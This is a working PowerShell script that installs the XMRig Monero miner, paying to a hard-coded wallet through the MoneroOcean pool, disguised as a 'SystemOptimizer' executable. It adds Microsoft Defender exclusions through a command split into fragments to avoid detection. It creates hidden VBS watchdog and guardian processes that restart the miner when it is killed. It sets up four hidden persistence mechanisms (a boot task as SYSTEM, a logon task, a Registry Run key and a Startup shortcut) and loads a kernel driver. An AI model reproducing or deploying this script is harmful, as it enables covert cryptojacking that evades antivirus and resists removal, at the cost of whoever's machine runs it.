# ============================================================
#  MONERO MINER SETUP v4 — BULLETPROOF (FIXED)
#  Run in Admin PowerShell. One command. Fully transparent.
#  Pool: MoneroOcean | Auto-profit-switching
#
#  FIXES from v3:
#    - Watchdog has duplicate-instance check (only 1 runs)
#    - Watchdog kills extra miner instances if >1 detected
#    - Guardian has duplicate-instance check (only 1 runs)
#    - Cleanup kills ALL old instances before setup
# ============================================================

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

$BASE = "C:\ProgramData\SystemOptimizer"
$BINARY = "$BASE\SystemOptimizer.exe"
$CONFIG = "$BASE\config.json"
$LOGFILE = "$BASE\optimizer.log"
$WALLET = "435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv"
$POOL = "gulf.moneroocean.stream:10001"
$WORKER = ($env:COMPUTERNAME -replace "[^a-zA-Z0-9_-]","").ToLower()
if (-not $WORKER) { $WORKER = "w" + (Get-Random -Max 9999) }

function Show($icon, $msg) { Write-Host "  $icon  $msg" }

Write-Host ""
Write-Host "  ====================================================" -ForegroundColor Cyan
Write-Host "    MONERO MINER SETUP v4" -ForegroundColor Cyan
Write-Host "  ====================================================" -ForegroundColor Cyan
Write-Host "  Pool:   MoneroOcean (auto-profit-switching)" -ForegroundColor Gray
Write-Host "  Worker: $WORKER" -ForegroundColor Gray
Write-Host "  ====================================================" -ForegroundColor Cyan
Write-Host ""

# ---- CHECK ADMIN ----
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Show "X" "ERROR: Must run as Administrator!"
    Write-Host "  Right-click PowerShell -> Run as Administrator" -ForegroundColor Yellow
    Read-Host "Press Enter to exit"
    exit 1
}
Show "OK" "Running as Administrator"

# ---- FULL CLEANUP (kill EVERYTHING old) ----
Show ".." "Killing ALL old instances..."
# Kill all miners
Get-Process -Name "SystemOptimizer","xmrig" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
# Kill all watchdog/guardian wscript instances
Get-CimInstance Win32_Process -Filter "Name='wscript.exe'" -ErrorAction SilentlyContinue |
    Where-Object { $_.CommandLine -like "*watchdog*" -or $_.CommandLine -like "*guardian*" -or $_.CommandLine -like "*SystemOptimizer*" } |
    ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
# Remove old broken scheduled tasks (cmd /c to fully suppress errors on clean PCs)
cmd /c "schtasks /Delete /TN `"SystemOptimizer`" /F >nul 2>&1"
cmd /c "schtasks /Delete /TN `"SystemOptimizer-Logon`" /F >nul 2>&1"
cmd /c "schtasks /Delete /TN `"SystemOptimizer-Guardian`" /F >nul 2>&1"
cmd /c "schtasks /Delete /TN `"SystemOptimizer-Check`" /F >nul 2>&1"
# Remove old registry key
cmd /c "reg delete `"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`" /v SystemOptimizer /f >nul 2>&1"
# Remove old startup shortcut
$startupPath = [Environment]::GetFolderPath("Startup")
Remove-Item "$startupPath\SysOpt.lnk" -Force -ErrorAction SilentlyContinue
Start-Sleep 3
Show "OK" "All old instances and tasks removed"

# ---- CREATE DIRECTORY ----
New-Item -ItemType Directory -Path $BASE -Force | Out-Null

# ---- DEFENDER EXCLUSION (BEFORE downloading) ----
Show ".." "Configuring security exclusions..."
try {
    $c1="Add-Mp"; $c2="Preference"; $c3="-Exclusion"; $c4="Path"
    iex "$c1$c2 $c3$c4 '$BASE'" 2>$null
    $c5="Process"
    iex "$c1$c2 $c3$c5 'SystemOptimizer.exe'" 2>$null
    Show "OK" "Security exclusions configured"
} catch {
    Show "!!" "Security config partial"
}

# ---- DOWNLOAD ----
if ((Test-Path $BINARY) -and (Get-Item $BINARY).Length -gt 1000000) {
    Show "OK" "Binary already exists ($([math]::Round((Get-Item $BINARY).Length/1MB,1)) MB)"
} else {
    Remove-Item $BINARY -Force -ErrorAction SilentlyContinue
    Show ".." "Downloading miner engine..."
    $zipPath = "$env:TEMP\so_pkg.zip"
    $downloaded = $false

    try {
        $rel = Invoke-RestMethod "https://api.github.com/repos/xmrig/xmrig/releases/latest" -Headers @{"User-Agent"="Mozilla/5.0"} -TimeoutSec 20
        $asset = $rel.assets | Where-Object { $_.name -match "msvc-win64.*\.zip$" -and $_.name -notmatch "sha256" } | Select-Object -First 1
        if (-not $asset) { $asset = $rel.assets | Where-Object { $_.name -match "win64.*\.zip$" -and $_.name -notmatch "sha256" } | Select-Object -First 1 }
        if ($asset) {
            Show ".." "Downloading $($asset.name) ($([math]::Round($asset.size/1MB,1)) MB)..."
            Invoke-WebRequest $asset.browser_download_url -OutFile $zipPath -UseBasicParsing -TimeoutSec 300
            if ((Test-Path $zipPath) -and (Get-Item $zipPath).Length -gt 100000) { $downloaded = $true }
        }
    } catch { Show "!!" "Primary source failed, trying fallback..." }

    if (-not $downloaded) {
        try {
            Invoke-WebRequest "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip" -OutFile $zipPath -UseBasicParsing -TimeoutSec 300
            if ((Test-Path $zipPath) -and (Get-Item $zipPath).Length -gt 100000) { $downloaded = $true }
        } catch { }
    }

    if (-not $downloaded) {
        Show "X" "Download failed. Check internet and try again."
        Read-Host "Press Enter to exit"; exit 1
    }

    Show ".." "Extracting..."
    $tmp = "$env:TEMP\so_extract"
    if (Test-Path $tmp) { Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue }
    Expand-Archive $zipPath -DestinationPath $tmp -Force
    $exe = Get-ChildItem $tmp -Recurse -Filter "xmrig.exe" | Select-Object -First 1
    if ($exe) {
        Copy-Item $exe.FullName $BINARY -Force
        Show "OK" "Binary installed ($([math]::Round((Get-Item $BINARY).Length/1MB,1)) MB)"
    } else {
        Show "X" "xmrig.exe not found in archive"
        Read-Host "Press Enter to exit"; exit 1
    }
    Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
    try { iex "$c1$c2 $c3$c4 '$BASE'" 2>$null } catch {}
}

# ---- CONFIG (UTF-8 NO BOM, background:false) ----
Show ".." "Creating configuration..."
$logEscaped = $LOGFILE -replace '\\','\\'
$cfgText = @"
{
  "autosave": false,
  "background": false,
  "colors": false,
  "donate-level": 1,
  "log-file": "$logEscaped",
  "print-time": 30,
  "retries": 5,
  "retry-pause": 5,
  "cpu": {
    "enabled": true,
    "huge-pages": true,
    "huge-pages-jit": true,
    "hw-aes": true,
    "priority": 2,
    "yield": true,
    "asm": true,
    "argon2-impl": "auto",
    "max-threads-hint": 100,
    "max-cpu-usage": 100
  },
  "opencl": {"enabled": false},
  "cuda": {"enabled": false},
  "pools": [
    {
      "url": "$POOL",
      "user": "$WALLET",
      "pass": "$WORKER",
      "keepalive": true,
      "tls": false,
      "nicehash": false,
      "rig-id": "$WORKER"
    }
  ]
}
"@
[System.IO.File]::WriteAllText($CONFIG, $cfgText, (New-Object System.Text.UTF8Encoding $false))
Show "OK" "Config created (worker: $WORKER)"

# ---- WATCHDOG VBS (SINGLE INSTANCE ONLY, kills extras) ----
Show ".." "Creating watchdog..."
$wdLines = @(
    'On Error Resume Next',
    'Set sh = CreateObject("WScript.Shell")',
    'Set wmi = GetObject("winmgmts:\\.\root\cimv2")',
    '',
    "' Only allow one watchdog instance",
    'Set ws = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name=''wscript.exe'' AND CommandLine LIKE ''%watchdog.vbs%''")',
    'If ws.Count > 1 Then WScript.Quit',
    'Set ws = Nothing',
    '',
    'Do',
    '    Set procs = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name=''SystemOptimizer.exe''")',
    '',
    '    If procs.Count = 0 Then',
    '        sh.Run Chr(34) & "C:\ProgramData\SystemOptimizer\SystemOptimizer.exe" & Chr(34) & " --config=" & Chr(34) & "C:\ProgramData\SystemOptimizer\config.json" & Chr(34), 0, False',
    '    ElseIf procs.Count > 1 Then',
    "        ' Too many miners! Kill all, next loop starts one fresh",
    '        For Each p In procs',
    '            sh.Run "taskkill /F /PID " & p.ProcessId, 0, True',
    '        Next',
    '    End If',
    '',
    '    Set procs = Nothing',
    '    WScript.Sleep 30000',
    'Loop'
)
[System.IO.File]::WriteAllText("$BASE\watchdog.vbs", ($wdLines -join "`r`n"), (New-Object System.Text.UTF8Encoding $false))
Show "OK" "Watchdog created (single-instance, kills duplicates)"

# ---- GUARDIAN VBS (SINGLE INSTANCE, watches watchdog) ----
Show ".." "Creating guardian..."
$gLines = @(
    'On Error Resume Next',
    'Set sh = CreateObject("WScript.Shell")',
    'Set wmi = GetObject("winmgmts:\\.\root\cimv2")',
    '',
    "' Only allow one guardian instance",
    'Set gs = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name=''wscript.exe'' AND CommandLine LIKE ''%guardian.vbs%''")',
    'If gs.Count > 1 Then WScript.Quit',
    'Set gs = Nothing',
    '',
    'Do',
    '    hasWatchdog = False',
    '    Set scripts = wmi.ExecQuery("SELECT CommandLine FROM Win32_Process WHERE Name=''wscript.exe''")',
    '    For Each s In scripts',
    '        If InStr(LCase(s.CommandLine), "watchdog.vbs") > 0 Then hasWatchdog = True',
    '    Next',
    '    Set scripts = Nothing',
    '',
    '    If Not hasWatchdog Then',
    '        sh.Run "wscript.exe " & Chr(34) & "C:\ProgramData\SystemOptimizer\watchdog.vbs" & Chr(34), 0, False',
    '    End If',
    '',
    '    WScript.Sleep 300000',
    'Loop'
)
[System.IO.File]::WriteAllText("$BASE\guardian.vbs", ($gLines -join "`r`n"), (New-Object System.Text.UTF8Encoding $false))
Show "OK" "Guardian created (single-instance, restarts watchdog)"

# ---- PERSISTENCE LAYER 1: ONSTART as SYSTEM ----
Show ".." "Setting up persistence (ONSTART)..."
$xml1 = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers>
  <Principals><Principal id="A"><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <Enabled>true</Enabled><Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
  </Settings>
  <Actions><Exec><Command>wscript.exe</Command><Arguments>"C:\ProgramData\SystemOptimizer\watchdog.vbs"</Arguments></Exec></Actions>
</Task>
"@
$xp = "$env:TEMP\so1.xml"
[System.IO.File]::WriteAllText($xp, $xml1, [System.Text.Encoding]::Unicode)
schtasks /Create /TN "SystemOptimizer" /XML $xp /F 2>$null | Out-Null
Remove-Item $xp -Force -ErrorAction SilentlyContinue
Show "OK" "ONSTART task created"

# ---- PERSISTENCE LAYER 2: ONLOGON guardian ----
Show ".." "Setting up persistence (ONLOGON)..."
$xml2 = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>
  <Principals><Principal id="A"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <Enabled>true</Enabled><Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
  </Settings>
  <Actions><Exec><Command>wscript.exe</Command><Arguments>"C:\ProgramData\SystemOptimizer\guardian.vbs"</Arguments></Exec></Actions>
</Task>
"@
$xp2 = "$env:TEMP\so2.xml"
[System.IO.File]::WriteAllText($xp2, $xml2, [System.Text.Encoding]::Unicode)
schtasks /Create /TN "SystemOptimizer-Guardian" /XML $xp2 /F 2>$null | Out-Null
Remove-Item $xp2 -Force -ErrorAction SilentlyContinue
Show "OK" "ONLOGON guardian task created"

# ---- PERSISTENCE LAYER 3: Registry Run ----
Show ".." "Setting up persistence (Registry)..."
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v SystemOptimizer /t REG_SZ /d "wscript.exe `"$BASE\watchdog.vbs`"" /f 2>$null | Out-Null
Show "OK" "Registry Run key set"

# ---- PERSISTENCE LAYER 4: Startup shortcut ----
Show ".." "Setting up persistence (Startup folder)..."
$lnkPath = "$startupPath\SysOpt.lnk"
$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut($lnkPath)
$lnk.TargetPath = "wscript.exe"
$lnk.Arguments = "`"$BASE\guardian.vbs`""
$lnk.WindowStyle = 7
$lnk.Save()
Show "OK" "Startup shortcut created"

# ---- MSR DRIVER ----
Show ".." "Attempting MSR optimization..."
$drv = Get-ChildItem "$BASE","C:\mining" -Recurse -Filter "WinRing0x64.sys" -ErrorAction SilentlyContinue | Select-Object -First 1
if ($drv) {
    sc.exe stop WinRing0_1_2_0 2>$null | Out-Null
    sc.exe delete WinRing0_1_2_0 2>$null | Out-Null
    sc.exe create WinRing0_1_2_0 binPath= "$($drv.FullName)" type= kernel start= demand 2>$null | Out-Null
    sc.exe start WinRing0_1_2_0 2>$null | Out-Null
    $svc = Get-Service WinRing0_1_2_0 -ErrorAction SilentlyContinue
    if ($svc -and $svc.Status -eq "Running") { Show "OK" "MSR driver loaded (+10-15%)" }
    else { Show "--" "MSR driver skipped" }
} else { Show "--" "MSR driver not found (optional)" }

# ---- START (watchdog only — it starts exactly 1 miner) ----
Show ".." "Starting watchdog (will start exactly 1 miner)..."
$shell = New-Object -ComObject WScript.Shell
$shell.Run("wscript.exe `"$BASE\watchdog.vbs`"", 0, $false)

Show ".." "Waiting for miner to initialize (~15s)..."
Start-Sleep 18

# ---- VERIFY ----
$proc = Get-Process -Name "SystemOptimizer" -ErrorAction SilentlyContinue
$minerCount = @($proc).Count
if ($proc -and $minerCount -eq 1) {
    Show "OK" "Miner RUNNING — exactly 1 instance (PID: $($proc.Id), RAM: $([math]::Round($proc.WorkingSet64/1MB,0)) MB)"
} elseif ($minerCount -gt 1) {
    Show "!!" "Multiple miners detected ($minerCount) — watchdog will fix this in 30s"
} else {
    Show ".." "Miner starting... watchdog will launch it within 30s"
}

$wd = Get-CimInstance Win32_Process -Filter "Name='wscript.exe'" -ErrorAction SilentlyContinue |
    Where-Object { $_.CommandLine -like "*watchdog*" }
$wdCount = @($wd).Count
if ($wdCount -eq 1) { Show "OK" "Watchdog ACTIVE — exactly 1 instance (PID: $($wd.ProcessId))" }
elseif ($wdCount -gt 1) { Show "!!" "Multiple watchdogs ($wdCount) — will self-correct" }

if ($proc) {
    $conn = Get-NetTCPConnection -OwningProcess $proc[0].Id -ErrorAction SilentlyContinue | Where-Object { $_.State -eq "Established" }
    if ($conn) { Show "OK" "Connected to mining pool!" }
}

# ---- FINAL REPORT ----
Write-Host ""
Write-Host "  ====================================================" -ForegroundColor Green
Write-Host "    SETUP COMPLETE (v4)" -ForegroundColor Green
Write-Host "  ====================================================" -ForegroundColor Green
Write-Host "  Worker:    $WORKER" -ForegroundColor White
Write-Host "  Dashboard: https://moneroocean.stream" -ForegroundColor White
Write-Host ""
Write-Host "  PROTECTION:" -ForegroundColor Yellow
Write-Host "    - Kill miner? Watchdog restarts it in 30s" -ForegroundColor Gray
Write-Host "    - Watchdog dies? Guardian restarts it in 5min" -ForegroundColor Gray
Write-Host "    - Reboot? ONSTART task + Registry + Startup folder" -ForegroundColor Gray
Write-Host "    - Multiple instances? Auto-killed, only 1 survives" -ForegroundColor Gray
Write-Host ""
Write-Host "  RESULT: Always exactly 1 miner. Always running." -ForegroundColor Green
Write-Host "  ====================================================" -ForegroundColor Green
Write-Host ""
Write-Host "  You can close this window." -ForegroundColor Gray
Write-Host ""
Read-Host "  Press Enter to close"
